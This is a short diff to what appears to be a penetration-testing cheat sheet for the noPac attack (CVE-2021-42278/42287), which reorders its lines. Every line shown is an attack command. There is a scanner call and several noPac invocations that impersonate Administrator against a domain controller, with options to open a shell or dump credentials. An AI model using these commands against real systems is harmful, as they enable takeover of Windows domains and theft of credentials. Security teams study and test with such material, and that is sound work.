@@ -1,5 +1,5 @@
-# noPac — CVE-2021-42278/42287 (Sam-Account-Name spoofing)
 scanner $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
-noPac $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
+# noPac — CVE-2021-42278/42287 (Sam-Account-Name spoofing)
 noPac $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -shell
 noPac "$DOMAIN"/"$USER":"$PASSWORD" -dc-ip "$DC_IP" --impersonate "Administrator"
+noPac $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
